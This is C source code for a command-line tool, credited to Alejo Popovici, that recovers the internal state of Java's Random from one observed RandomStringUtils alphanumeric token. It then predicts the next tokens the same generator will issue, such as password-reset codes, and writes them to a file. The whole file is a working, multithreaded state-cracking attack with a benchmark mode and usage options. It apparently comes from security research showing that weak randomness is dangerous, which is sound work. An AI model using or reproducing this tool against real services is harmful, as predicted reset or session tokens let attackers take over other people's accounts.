#include <stdio.h>
#include <string.h>
#include <sys/time.h>
#include <sys/wait.h>
#include <errno.h>
#include <signal.h>
#include <pthread.h>
#include <stdlib.h>
#include <unistd.h>
#include <math.h>
#include <sys/resource.h>
#define MAX_TOKEN_SIZE 1024
static int benchmarkMode = 0;
static int bLang3 = 0;
static long startfrom = 0;
static long tokens_get = 100;
static char resetCode[MAX_TOKEN_SIZE] = "TPIjPBmthTbDqZVH3GOXUW6rJoy7rV"; //Default string
static long tokenSize = 30;
static int nThreads = 0;
static long *seedstate;
static long *ptrPos = NULL;

static inline int nextInt(int n, int thread)
{
	int bits,val;
	seedstate[thread] = (seedstate[thread] * 0x5DEECE66DL + 0xBL) & ((1L << 48) - 1);
	bits = (int) (seedstate[thread] >> (17));
	val = bits % n;
    return val;
}

static inline int isValid(char ch)
{
	if(ch < '0') return 0;
	if(ch > 'z') return 0;
	if((ch > '9') && (ch < 'A')) return 0;
	if((ch > 'Z') && (ch < 'a')) return 0;
	return 1;
}
static inline char getChar(int count, long guessedSeed) 
{
    long seedlocal = guessedSeed;
	long bits,val;
    char ch = 0;
    while (count-- != 0) 
    {
    	seedlocal = (seedlocal * 0x5DEECE66DL + 0xBL) & ((1L << 48) - 1);
		bits = seedlocal >> (17);
		val = bits % 91;
        ch = (char) (val+32);
        if (!isValid(ch))
        {
            count++;
        }
    }
    return ch;
}

inline static char *getString(int count, long guessedSeed) 
{
	char *buffer = malloc(count+10);
	memset(buffer, 0, count+10);
    seedstate[nThreads+1] = guessedSeed;
    while (count-- != 0) {
        char ch;
        ch = (char) (nextInt(91, nThreads+1) + 32);
        if (isValid(ch))
        {
        	if(count > 0) buffer[count-1] = ch;
        } else {
            count++;
        }
    }
    buffer[count] = '\0';
    return buffer;
}

void reverse(char *szTorev, unsigned long len)
{
	unsigned long i = 0;
	char *szTemp = malloc(len+1);
	memcpy(szTemp, szTorev, len);
	for(i = 0; i < len; i++) szTorev[i] = szTemp[len-i-1];
	free(szTemp);
}

void *thrEnd(void *params)
{
	while(1)
	{
		sleep(1);
		float position = ((float) (*ptrPos)) / (pow(2,48)) * 100.0f;
		if(position >= 100.0f)
		{
			exit(1);
		}
	}
}

void *thrCalc(void *params)
{
	long i = 0;
	long iThread = (long) params;
    long sub1 = (long) resetCode[tokenSize-1]; //Stealing first bits.
    char sub2 = resetCode[tokenSize-2];
    char sub3 = resetCode[tokenSize-3];
    char sub4 = resetCode[tokenSize-4];
    char sub5 = resetCode[tokenSize-5];
    char sub6 = resetCode[tokenSize-6];
	long internalSeed = (sub1-32) << 17;
	long increment = (91 << 17) * nThreads;
	internalSeed += (91 << 17)*iThread;
	if(benchmarkMode)
	{
		long temp = (212602633940717 >> 17) << 17;
		temp = temp / (increment/nThreads);
		internalSeed+=((temp-pow(2,17))*(increment/nThreads)); //We take 2^17 operations away to benchmark.
	}
	internalSeed += increment*startfrom;
	if(iThread == 0) 
	{
		ptrPos = &internalSeed;
		printf("[*] Starting from state: %li.\n", internalSeed)	;
	}
	while(1)
	{
		for(i = 0; i < 131072; i++) //Each "for" goes through 17 bits.
		{
			long calcSeed = internalSeed | i;
			if(getChar(1,calcSeed) == sub2)
			{
				if(getChar(2,calcSeed) == sub3)
				{
					if(getChar(3,calcSeed) == sub4)
					{
						if(getChar(4,calcSeed) == sub5)
						{
							if(getChar(5,calcSeed) == sub6)
							{
								char *szRes = getString(tokenSize,calcSeed);
								szRes[tokenSize-1] = (char) sub1;
								if(strcmp(szRes, resetCode) == 0)	
								{
									printf("[*] State = %li\n",calcSeed);
									if(!benchmarkMode)
									{
										printf("[+] Writing the next %li tokens to ./out.txt...\n",tokens_get);
										FILE *pFile = fopen("./out.txt", "w");
										if(!pFile)
										{
											printf("[-] No write permissions on current dir.\n[+] Defaulting to /tmp/out.txt...\n");
											pFile = fopen("/tmp/out.txt", "w");
											if(!pFile)
											{
												printf("[-] No write permissions there either.\n[+] Defaulting to stdout\n");
												pFile = stdout;
											}
										}
										long amountGet = tokens_get*2+tokenSize+(tokenSize-1);
										char *szRes = getString(amountGet,calcSeed);
										int j = 0;
										for(j = 0; j < tokens_get; j++)
										{
											char *szToken = malloc(tokenSize+5);
											memset(szToken,0,tokenSize+5);
											memcpy(szToken, szRes+amountGet-((tokenSize)+j+(tokenSize)), tokenSize);
											if(bLang3)reverse(szToken, tokenSize);
											strcat(szToken, "\n");
											fputs(szToken, pFile);
											free(szToken);
										}
									}
									exit(0);
								}
							}
						}
					}
				}
			}
		}
		internalSeed+=increment;
	}
}

void printUsage(char *argv0)
{
	printf("\n Usage: %s [options] original_token\n", argv0);
	printf(" Options:\n");
	printf("   -b: benchmark mode. All other options ignored.\n");
	printf("   -l3: using lang3 version instead of original lang (false by default).\n");
	printf("   -n [number]: Amount of tokens to output (100 by default).\n");
	printf("   -s [number]: Start from a percentage (0 to 100) of the possible state (0 by default).\n\n");
	exit(1);
}

void parseArgs(int argc, char *argv[])
{
	printf("Cracks RandomStringUtils.RandomAlphaNumeric()\nBy Alejo Popovici @alex91dotar (Apok)\n\n");
	long i = 0;
	if(argc < 2) printUsage(argv[0]);
	for(i = 0; i < argc; i++)
	{
		if(argv[i][0] == '-') //Parse options
		{
			if(!strcmp(argv[i], "-b")) 
			{
				benchmarkMode++;
				break;
			}
			else if(!strcmp(argv[i], "-l3")) bLang3++;
			else if(!strcmp(argv[i], "-n"))
			{
				if(argc > i+1)
				{
					tokens_get = atol(argv[i+1]);
					if(tokens_get > 0) continue;
				}
				printf("[-] Invalid or absent amount of tokens.\n");
				printUsage(argv[0]);
			}
			else if(!strcmp(argv[i], "-s"))
			{
				if(argc > i+1)
				{
					long percstartfrom = atol(argv[i+1]);
					if(percstartfrom >= 0 && percstartfrom < 100)
					{
						startfrom = pow(2,48);
						startfrom /= (91 << 17) * nThreads;
						startfrom *= (percstartfrom / 100.0f);
						continue;
					}
				}
				printf("[-] Invalid or absent start value.\n");
				printUsage(argv[0]);
			}
			else
			{
				printf("[-] Unrecognized option %s\n", argv[i]);
				printUsage(argv[0]);
			}
		}
	}
	if(benchmarkMode)
	{
		bLang3 = 0;
		startfrom = 0;
		return;
	}
	//The last parameter is the reset code.
	char *szReset = argv[argc-1];
	if(szReset[0] == '-')
	{
		printf("[-] Token missing.\n");
		printUsage(argv[0]);
	}
	tokenSize = strlen(szReset);
	if(tokenSize > MAX_TOKEN_SIZE)
	{
		printf("[-] Token is too long (MAX_TOKEN_SIZE=%i).\n", MAX_TOKEN_SIZE);
		printf("[-] Recompile with a larger size if you need it.\n");
		printf("[+] Bye!\n");
		exit(1);
	}
	if(tokenSize < 8)
	{
		printf("[-] Sorry! Token is too short.\n");
		printf("[-] You need at least 8 characters to avoid colissions.\n");
		printf("[+] Bye!\n");
		exit(1);
	}
	for(i = 0; i < tokenSize;i++) if(!isValid(szReset[i]))
	{
		printf("[-] This is not a RandomAlphaNumeric token!.\n");
		printf("[-] Token may only contain numbers or letters.\n");
		printf("[+] Bye!\n");
		exit(1);
	}
	strcpy(resetCode, szReset);
}

void printStats(long elapsed)
{
	float position = ((float) (*ptrPos)) / (pow(2,48)) * 100.0f;
	float remaining = ((100.0f / position) * ((float)(elapsed)) - ((float)(elapsed))) / 60.0f;
	printf("[*] Covered: %.2f%% of possible states.\n", position);
	printf("[*] Current guess: %li\n", *ptrPos);
	printf("[*] %.0f minutes remaining\n", remaining);
}

int main(int argc, char *argv[])
{
	nThreads = sysconf(_SC_NPROCESSORS_ONLN);
	parseArgs(argc, argv);
	seedstate = malloc(sizeof(long)*(nThreads+1));
	pthread_t *thrId = malloc(sizeof(pthread_t)*(nThreads+1));
	long i = 0;
	struct timeval after;
	struct timeval before;
	gettimeofday(&before, NULL);
	int id = fork();
	int iStat = 0;
	if(id == 0)
	{
		seedstate = malloc(sizeof(long)*(nThreads+1));
		if(benchmarkMode)printf("=== Benchmark Mode ===\n");
		printf("[*] Original token provided: %s\n[*] Size of token:%li\n", resetCode, tokenSize);
		if(bLang3)
		{
			printf("[+] Lang3 version mode in use. Reversing token...\n");
			reverse(resetCode, tokenSize);
			printf("[*] Reversed token: %s\n", resetCode);
		}
		printf("[+] Cracking state...\n");
		printf("[*] Number of threads: %i\n",nThreads);
		seedstate = malloc(sizeof(long)*(nThreads+1));
		for(i = 0; i < nThreads; i++)
		{
			pthread_create(&thrId[i], NULL, thrCalc, (void*)i); 
		}
		pthread_create(&thrId[nThreads], NULL, thrEnd, NULL);
		while(1)
		{
			if(!benchmarkMode)
			{
				char key[5];
				printf("[+] Press enter for stats...\n");
				getchar();
				gettimeofday(&after, NULL);
				long elapsedsec = after.tv_sec - before.tv_sec;
				printStats(elapsedsec);
			}
			else sleep(-1);
		}
	}
	else
	{
		if(setpriority(PRIO_PROCESS, id, 0) == -1) perror("setpriority");
		waitpid(id, &iStat, 0);
	}
	gettimeofday(&after, NULL);
	long elapsedsec = after.tv_sec - before.tv_sec;
	long elapsedusec = after.tv_usec - before.tv_usec;
	float elapsed = 0.0f;
	if(elapsedusec < 1)
	{
		elapsedsec--;
		elapsedusec = abs(elapsedusec);
	}
	elapsed = (float) elapsedsec + (float) elapsedusec / 1000000.0f;
	if(benchmarkMode)
	{
		float extrapolate = elapsed * pow(2,7.5f);
		printf("[*] 40.5 bits cracked in %f seconds.\n", elapsed);
		printf("[*] To crack the state would take a maximum of %f seconds.\n", extrapolate);
		if(extrapolate > 3600.0f) printf("[*] Or %f hours.\n", extrapolate/3600.f);
		if(extrapolate > 86400.0f) printf("[*] Or %f days.\n", extrapolate/86400.f);
	}
	else 
	{
		if(WEXITSTATUS(iStat))
		{
			printf("[-] Sorry! Couldn't crack the state.\n");
			printf("[-] Maybe they are using good random?.\n");
			printf("[-] Try with -l3, they might be using Lang3's version.\n");
			printf("[-] You've made your pc waste %f seconds.\n", elapsed);
		}
		else printf("[*] Cracked in: %f seconds\n", elapsed);
	}
	printf("[+] Bye!\n");
	return 0;
}